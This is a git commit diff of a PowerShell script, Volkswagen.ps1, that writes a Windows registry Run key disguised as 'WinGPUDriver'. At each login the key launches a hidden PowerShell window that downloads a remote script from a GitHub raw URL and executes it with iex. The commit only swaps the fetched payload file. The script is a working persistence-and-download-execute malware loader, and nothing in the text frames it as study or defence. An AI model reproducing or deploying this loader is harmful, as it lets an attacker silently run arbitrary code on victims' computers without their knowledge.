1835d7cdfe6bbf6b8132ecf2b8b83fb60ccc3a59
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-20 14:15:27 +0200

    Update Volkswagen.ps1

--- Volkswagen.ps1
+++ Volkswagen.ps1
@@ -1,3 +1,3 @@
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 -Name "WinGPUDriver" `
--Value 'powershell -w hidden -Command "iex (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra.ps1\")"'
+-Value 'powershell -w hidden -Command "iex (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1\")"'
